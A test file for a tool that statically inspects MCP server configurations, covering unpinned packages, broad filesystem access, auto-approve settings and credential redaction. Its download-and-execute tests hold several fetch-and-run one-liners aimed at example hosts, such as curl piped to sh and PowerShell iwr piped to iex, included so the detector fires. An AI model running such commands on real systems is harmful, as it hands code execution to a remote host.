import { describe, expect, it } from "vitest";
import { InspectError } from "../../src/inspect/common.js";
import { MAX_SERVERS, STANDING_NOTE, inspectMcpConfig, isBroadPath, npmPinState, pythonPinState } from "../../src/inspect/mcpConfig.js";
import { isPlaceholder } from "../../src/inspect/secrets.js";
import { configReportPage } from "../../src/inspect/pages.js";
import { rule, rules, VERDICT_WORDS } from "./helpers.js";

const cfg = (servers: Record<string, unknown>) => inspectMcpConfig(JSON.stringify({ mcpServers: servers }));

const CLEAN = {
  files: { command: "npx", args: ["-y", "@modelcontextprotocol/server-filesystem@2025.8.21", "/home/me/projects/site"] },
  py: { command: "uvx", args: ["mcp-server-time==1.4.0"] },
  remote: { type: "http", url: "https://mcp.example.com/mcp", headers: { Authorization: "Bearer ${MCP_TOKEN}" } },
  local: { command: "node", args: ["./server.js"], env: { GITHUB_TOKEN: "<your-token>", LOG_LEVEL: "debug", API_BASE: "https://api.example.com" } },
};

describe("clean config", () => {
  it("no findings, standing note, and no verdict words", () => {
    const r = cfg(CLEAN);
    expect(r.findings).toEqual([]);
    expect(r.summary).toBe(`No findings from the ${r.checksRun.length} checks that ran.`);
    expect(r.note).toBe("Static reading of settings. Cannot tell whether a server is malicious; no findings is not a safety guarantee. Nothing here was run.");
    expect(JSON.stringify({ ...r, note: "" })).not.toMatch(VERDICT_WORDS);
  });

  it("accepts mcpServers, a bare server map, and a single server block", () => {
    const block = { command: "npx", args: ["-y", "some-server"] };
    expect(inspectMcpConfig(JSON.stringify({ mcpServers: { a: block } })).input.shape).toBe("mcpServers");
    expect(inspectMcpConfig(JSON.stringify({ a: block })).input.shape).toBe("server-map");
    const single = inspectMcpConfig(JSON.stringify(block));
    expect(single.input.shape).toBe("single-server");
    expect(rule(single, "mcp.unpinned-package")!.items[0]!.location).toEqual({ path: "$.args[1]" });
  });
});

describe("1. unpinned install-and-run", () => {
  it.each([
    ["no version", ["-y", "some-server"]],
    ["@latest", ["-y", "some-server@latest"]],
    ["scoped, no version", ["-y", "@org/server-thing"]],
    ["scoped @latest", ["@org/server-thing@latest"]],
    ["range", ["--yes", "some-server@^1.2.0"]],
    ["--package flag", ["--package", "@org/pkg", "pkg-bin", "--flag"]],
    ["--package=flag", ["--package=@org/pkg@next", "pkg-bin"]],
  ])("npx %s fires", (_name, args) => {
    const r = cfg({ s: { command: "npx", args } });
    const f = rule(r, "mcp.unpinned-package")!;
    expect(f.count).toBe(1);
    expect(f.items[0]!.explanation).toMatch(/pin it to an exact version you reviewed/);
    // Never invents a version number.
    expect(f.items[0]!.explanation).toMatch(/<version you reviewed>/);
    expect(f.items[0]!.explanation).not.toMatch(/@\d/);
  });

  it.each([
    ["exact", ["-y", "some-server@1.2.3"]],
    ["scoped exact", ["-y", "@org/server-thing@0.6.2"]],
    ["prerelease", ["@org/pkg@2.0.0-beta.1"]],
    ["local path", ["./tools/server"]],
    ["git commit", ["github:org/repo#4f2c1a9b7e"]],
  ])("npx %s stays silent", (_name, args) => {
    expect(rule(cfg({ s: { command: "npx", args } }), "mcp.unpinned-package")).toBeUndefined();
  });

  it("Windows paths and other runners: npx.cmd, pnpm dlx, npm exec, bunx, uvx, pipx run", () => {
    const r = cfg({
      win: { command: "C:\\Program Files\\nodejs\\npx.cmd", args: ["-y", "srv-a"] },
      dlx: { command: "pnpm", args: ["dlx", "srv-b@latest"] },
      exec: { command: "npm", args: ["exec", "--yes", "srv-c"] },
      bunx: { command: "bunx", args: ["srv-d"] },
      uvx: { command: "uvx", args: ["--python", "3.12", "mcp-srv-e"] },
      uvxLatest: { command: "uvx", args: ["mcp-srv-f@latest"] },
      uvxFrom: { command: "uvx", args: ["--from", "mcp-srv-g>=1.0", "srv-g"] },
      pipx: { command: "pipx", args: ["run", "mcp-srv-h"] },
      cmdWrap: { command: "cmd", args: ["/c", "npx", "-y", "srv-i"] },
      inline: { command: "npx -y srv-j" },
    });
    const pkgs = rule(r, "mcp.unpinned-package")!.items.map((i) => i.details!.package).sort();
    expect(pkgs).toEqual(["mcp-srv-e", "mcp-srv-f@latest", "mcp-srv-g>=1.0", "mcp-srv-h", "srv-a", "srv-b@latest", "srv-c", "srv-d", "srv-i", "srv-j"].sort());
  });

  it("pinned Python specs stay silent", () => {
    const r = cfg({ a: { command: "uvx", args: ["mcp-server-time==1.4.0"] }, b: { command: "uvx", args: ["mcp-x@0.3.1"] }, c: { command: "uvx", args: ["--from", "pkg[cli]==2.0.1", "pkg"] } });
    expect(rule(r, "mcp.unpinned-package")).toBeUndefined();
  });

  it("pin-state parsing", () => {
    expect(npmPinState("@scope/name@1.0.0")).toEqual({ pinned: true });
    expect(npmPinState("@scope/name")).toMatchObject({ pinned: false, name: "@scope/name" });
    expect(npmPinState("name@")).toMatchObject({ pinned: false, name: "name" });
    expect(npmPinState("C:\\srv")).toBeNull();
    expect(pythonPinState("pkg===1.0")).toEqual({ pinned: true });
    expect(pythonPinState("pkg==1.*")).toMatchObject({ pinned: false });
  });
});

describe("2. download-and-execute", () => {
  it.each([
    ["curl | sh", { command: "sh", args: ["-c", "curl -fsSL https://get.example.sh | sh"] }],
    ["wget | bash", { command: "bash", args: ["-c", "wget -qO- https://x.example/i.sh | sudo bash"] }],
    ["$(curl)", { command: "bash", args: ["-c", 'bash -c "$(curl -fsSL https://x.example/install)"'] }],
    ["iwr | iex", { command: "powershell", args: ["-Command", "iwr https://x.example/i.ps1 | iex"] }],
    ["iex (New-Object Net.WebClient)", { command: "pwsh", args: ["-c", "iex (New-Object Net.WebClient).DownloadString('https://x.example')"] }],
    ["curl | python", { command: "sh", args: ["-c", "curl https://x.example/a.py | python3"] }],
  ])("%s fires", (_name, server) => {
    expect(rule(cfg({ s: server }), "mcp.download-and-execute")!.count).toBe(1);
  });

  it("curl without a pipe to an interpreter stays silent", () => {
    expect(rule(cfg({ s: { command: "curl", args: ["-o", "out.txt", "https://x.example/file"] } }), "mcp.download-and-execute")).toBeUndefined();
  });
});

describe("3. plain http: loopback vs other hosts", () => {
  it("separate rule ids and explanations", () => {
    const r = cfg({
      dev: { type: "sse", url: "http://localhost:3000/sse" },
      dev6: { url: "http://[::1]:8080/mcp" },
      dev4: { command: "npx", args: ["mcp-remote@0.1.2", "http://127.0.0.1:9000/mcp"] },
      far: { type: "http", url: "http://mcp.example.com/mcp" },
      lan: { url: "http://192.168.1.20/mcp" },
      tls: { url: "https://mcp.example.com/mcp" },
    });
    expect(rule(r, "mcp.http-loopback")!.count).toBe(3);
    expect(rule(r, "mcp.http-non-loopback")!.items.map((i) => i.details!.host).sort()).toEqual(["192.168.1.20", "mcp.example.com"]);
    expect(rule(r, "mcp.http-loopback")!.items[0]!.explanation).not.toBe(rule(r, "mcp.http-non-loopback")!.items[0]!.explanation);
  });
});

describe("4. broad filesystem scope", () => {
  it.each(["/", "~", "~/", "$HOME", "${HOME}", "/home/alex", "/Users/alex/", "C:\\", "C:/", "C:", "C:\\Users\\alex", "%USERPROFILE%", "/root"])("%s fires", (p) => {
    const r = cfg({ filesystem: { command: "npx", args: ["-y", "@modelcontextprotocol/server-filesystem@2025.8.21", p] } });
    expect(rule(r, "mcp.broad-filesystem-scope")!.count).toBe(1);
  });

  it("project directories and non-filesystem servers stay silent", () => {
    expect(isBroadPath("/home/alex/projects/site")).toBe(false);
    expect(isBroadPath("C:\\Users\\alex\\code")).toBe(false);
    const r = cfg({ fs: { command: "npx", args: ["-y", "@modelcontextprotocol/server-filesystem@2025.8.21", "/home/alex/projects/site"] }, other: { command: "node", args: ["srv.js", "/"] } });
    expect(rule(r, "mcp.broad-filesystem-scope")).toBeUndefined();
  });
});

describe("5. privileged, container and shell entrypoints", () => {
  it("each fires on its own command and stays silent on node", () => {
    const r = cfg({
      root: { command: "sudo", args: ["node", "srv.js"] },
      box: { command: "docker", args: ["run", "-i", "--rm", "--privileged", "-v", "/:/host", "img:1.0"] },
      sh: { command: "/bin/bash", args: ["-c", "node srv.js"] },
      plain: { command: "node", args: ["srv.js"] },
    });
    expect(rule(r, "mcp.entrypoint-privileged")!.count).toBe(1);
    expect(rule(r, "mcp.entrypoint-container")!.items[0]!.details).toMatchObject({ notableFlags: ["--privileged", "-v"] });
    expect(rule(r, "mcp.entrypoint-shell")!.count).toBe(1);
    expect(rule(r, "mcp.entrypoint-shell")!.items[0]!.details!.server).toBe("sh");
  });
});

describe("6. auto-approve", () => {
  it("non-empty lists and trust: true fire; empty lists stay silent", () => {
    const r = cfg({ a: { command: "node", args: ["a.js"], autoApprove: ["read_file", "write_file"] }, b: { command: "node", args: ["b.js"], alwaysAllow: [] }, c: { command: "node", args: ["c.js"], trust: true } });
    const f = rule(r, "mcp.auto-approve")!;
    expect(f.count).toBe(2);
    expect(f.items[0]!.details).toMatchObject({ tools: ["read_file", "write_file"] });
  });
});

// Shaped like real credentials so the detectors fire; none of them is real.
const SECRETS = {
  github: "ghp_" + "A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8",
  openai: "sk-proj-" + "Zx9Yw8Vu7Ts6Rq5Po4Nm3Lk2Ji1Hg0Fe",
  aws: "AKIA" + "IOSFODNN7EXAMPL3",
  entropy: "q8W#vL2!pZ7rT$kM9xB4nF6hJ0dS3gA",
  named: "hunter2-but-longer",
  header: "abcdefghijklmnopqrstuvwxyz012345",
  arg: "tok_" + "9f8e7d6c5b4a39281706f5e4d3c2b1a0",
  query: "Qm9vYmFyQmF6UXV4MTIzNDU2Nzg5MA",
  urlpass: "s3cr3t-pa55",
};

describe("7. credentials (best-effort) and redaction", () => {
  const config = {
    mcpServers: {
      gh: { command: "npx", args: ["-y", "@org/gh@1.0.0"], env: { GITHUB_PERSONAL_ACCESS_TOKEN: SECRETS.github, OPENAI_KEY_VALUE: SECRETS.openai, AWS_ACCESS_KEY_ID: SECRETS.aws, RANDOM: SECRETS.entropy, DB_PASSWORD: SECRETS.named, LOG_LEVEL: "info" } },
      placeholders: { command: "node", args: ["x.js"], env: { API_KEY: "<api-key>", TOKEN: "${TOKEN}", SECRET: "your-secret-here", PASSWORD: "", OTHER_TOKEN: "sk-...", AUTH: "xxxxxxxx", WIN: "%MY_TOKEN%" } },
      remote: { url: `https://mcp.example.com/mcp?api_key=${SECRETS.query}`, headers: { Authorization: `Bearer ${SECRETS.header}`, "X-Trace": "on" } },
      args: { command: "node", args: ["srv.js", "--token", SECRETS.arg, `--target=https://user:${SECRETS.urlpass}@db.example.com/`] },
    },
  };

  it("flags real-looking values, leaves placeholders alone, and says best-effort", () => {
    const r = inspectMcpConfig(JSON.stringify(config));
    const env = rule(r, "mcp.credential-in-env")!;
    expect(env.items.map((i) => i.details!.setting).sort()).toEqual(["AWS_ACCESS_KEY_ID", "DB_PASSWORD", "GITHUB_PERSONAL_ACCESS_TOKEN", "OPENAI_KEY_VALUE", "RANDOM"]);
    expect(env.items.every((i) => i.explanation.startsWith("Best-effort detection"))).toBe(true);
    expect(env.items.every((i) => i.details!.server === "gh")).toBe(true);
    expect(rule(r, "mcp.credential-in-headers")!.items.map((i) => i.details!.setting)).toEqual(["Authorization"]);
    expect(rule(r, "mcp.credential-in-args")!.count).toBe(3); // --token, URL password, URL query
    expect(r.secretsNote).toMatch(/best-effort detection/);
  });

  it("no literal test secret appears anywhere in the serialized report or the rendered page", () => {
    const r = inspectMcpConfig(JSON.stringify(config));
    const json = JSON.stringify(r);
    const page = configReportPage(r);
    for (const secret of Object.values(SECRETS)) {
      expect(json).not.toContain(secret);
      expect(page).not.toContain(secret);
    }
    expect(json).toContain("[redacted]");
  });

  it("token shapes are redacted even where no rule looked (e.g. a server name)", () => {
    const r = inspectMcpConfig(JSON.stringify({ mcpServers: { [SECRETS.github]: { command: "npx", args: [`pkg-${SECRETS.openai}`] } } }));
    expect(JSON.stringify(r)).not.toContain(SECRETS.github);
    expect(JSON.stringify(r)).not.toContain(SECRETS.openai);
  });

  it("placeholder recognition", () => {
    for (const p of ["<token>", "${GITHUB_TOKEN}", "${env:X}", "$TOKEN", "%TOKEN%", "{{token}}", "your-api-key", "YOUR_TOKEN_HERE", "xxxxxxxx", "****", "sk-...", "ghp_xxxxxxxx", "Bearer ${TOKEN}", "changeme", ""]) {
      expect(isPlaceholder(p), p).toBe(true);
    }
    for (const s of Object.values(SECRETS)) expect(isPlaceholder(s), s).toBe(false);
  });
});

describe("errors and robustness", () => {
  it("invalid JSON: a clear error that never quotes the input", () => {
    const bad = `{"mcpServers": {"x": {"env": {"TOKEN": "${SECRETS.github}"}}`;
    let caught: unknown;
    try {
      inspectMcpConfig(bad);
    } catch (err) {
      caught = err;
    }
    expect(caught).toBeInstanceOf(InspectError);
    expect((caught as InspectError).code).toBe("bad_json");
    expect((caught as InspectError).message).not.toContain(SECRETS.github);
    expect((caught as InspectError).message).not.toContain("mcpServers");
  });

  it.each([["[]"], ["42"], ['"x"'], ["null"], ["{}"], ['{"a": 1}'], ["   "]])("%s is refused with a clear error", (input) => {
    expect(() => inspectMcpConfig(input)).toThrow(InspectError);
  });

  it("hundreds of servers: checks the first MAX_SERVERS and says so", () => {
    const servers = Object.fromEntries(Array.from({ length: 700 }, (_, i) => [`s${i}`, { command: "npx", args: ["-y", `pkg-${i}`] }]));
    const started = Date.now();
    const r = cfg(servers);
    expect(Date.now() - started).toBeLessThan(5_000);
    expect(r.input).toMatchObject({ servers: 700, analyzedServers: MAX_SERVERS, truncated: true });
    const f = rule(r, "mcp.unpinned-package")!;
    expect(f.count).toBe(MAX_SERVERS);
    expect(f.truncated).toBe(true);
    expect(r.limits.notes.join(" ")).toMatch(/only the first 200/);
  });

  it("odd values don't crash: non-string args, non-object entries, nested junk", () => {
    const r = inspectMcpConfig(JSON.stringify({ mcpServers: { a: { command: 5, args: [null, 3, { x: 1 }], env: { A: 1 } }, b: "not a server", c: { command: "npx", args: "not-an-array" } } }));
    expect(r.input.skipped).toEqual(["b"]);
    expect(rules(r)).toEqual(rules(r)); // ran to completion
  });

  it("oversized input is refused", () => {
    expect(() => inspectMcpConfig(" ".repeat(1024 * 1024 + 1))).toThrow(/limit/);
  });

  it("standing note is on every report", () => {
    expect(cfg({ a: { command: "npx", args: ["x"] } }).note).toBe(STANDING_NOTE);
  });
});
